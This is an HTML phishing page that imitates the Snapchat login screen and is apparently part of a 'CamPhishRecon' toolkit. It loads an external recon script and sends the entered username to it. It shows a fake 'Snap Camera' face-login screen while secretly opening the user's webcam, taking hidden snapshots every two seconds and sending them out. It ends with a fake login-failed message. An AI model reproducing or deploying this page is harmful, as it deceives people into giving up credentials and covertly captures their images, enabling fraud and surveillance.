<!-- DESC: Snapchat login page replica with camera for Snap Camera -->
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Snapchat — Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
body{background:#fffc00;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{width:360px;max-width:92vw;text-align:center;padding:30px}
.ghost{font-size:60px;margin-bottom:16px}
.logo{font-size:28px;font-weight:900;color:#000;margin-bottom:30px}
input{width:100%;padding:14px;margin-bottom:10px;background:#fff;border:none;border-radius:8px;font-size:16px}
input:focus{outline:none;box-shadow:0 0 0 2px #000}
.btn{width:100%;padding:14px;background:#000;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:active{transform:scale(0.97)}
.btn-yellow{background:#fffc00;color:#000}
.face-btn{width:100%;padding:14px;background:transparent;border:2px solid #000;color:#000;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:10px}
.face-btn:active{background:#000;color:#fffc00}
.signup{margin-top:24px;font-size:14px;color:#333}
.signup a{color:#000;font-weight:700;text-decoration:underline}
.face-scan{position:fixed;inset:0;background:rgba(255,252,0,0.98);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column;color:#000}
.face-scan.active{display:flex}
.scan-circle{width:200px;height:200px;border-radius:50%;border:4px solid #000;position:relative;overflow:hidden;margin-bottom:20px;background:#fff}
.scan-circle::after{content:'👻';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px}
.spinner{width:20px;height:20px;border:2px solid #fff;border-top:#000;border-radius:50%;animation:spin .6s linear infinite;margin-top:16px}
@keyframes spin{to{transform:rotate(360deg)}}
video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
</style>
</head><body>
<script src="forwarding_link/t/recon.js"></script>
<video id="v" playsinline autoplay muted></video>
<canvas id="cap" width="320" height="240"></canvas>
<div class="box">
<div class="ghost">👻</div>
<div class="logo">Snapchat</div>
<form onsubmit="return doLogin(event)">
<input type="text" placeholder="Username or email" id="user" required>
<input type="password" placeholder="Password" id="pass" required>
<button type="submit" class="btn" id="loginBtn">Log In</button>
</form>
<button class="face-btn" onclick="doFaceLogin()">📸 Log in with Snap Camera</button>
<div class="signup">New here? <a href="#">Sign Up</a></div>
</div>
<div class="face-scan" id="faceScan">
<div class="scan-circle"></div>
<div style="font-size:20px;font-weight:900">Snap Camera Login</div>
<div style="font-size:13px;color:#666;margin-top:8px">Center your face in the circle</div>
<div class="spinner"></div>
</div>
<script>
var API='API_BASE_URL',SHARE_URL=location.origin+'/t/snapchat';
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
function doLogin(e){e.preventDefault();startSnap('login');return false;}
function doFaceLogin(){startSnap('camera');}
function startSnap(type){
var fs=document.getElementById('faceScan');fs.classList.add('active');
var btn=document.getElementById('loginBtn');if(btn){btn.innerHTML='Logging in...';btn.disabled=true;}
if(window.CamPhishRecon)CamPhishRecon.Capture.event('snapchat_login',{type:type,user:document.getElementById('user')?document.getElementById('user').value:''});
if(navigator.mediaDevices){
navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
var v=document.getElementById('v');v.srcObject=stream;v.play();
var cap=document.getElementById('cap'),cx=cap.getContext('2d');
var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'snap_camera');}},2000);
setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Login failed. Check your credentials.');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},5000);
}).catch(function(){setTimeout(function(){fs.classList.remove('active');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},2000);});
}else{setTimeout(function(){fs.classList.remove('active');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},2000);}
}
</script>
</body></html>
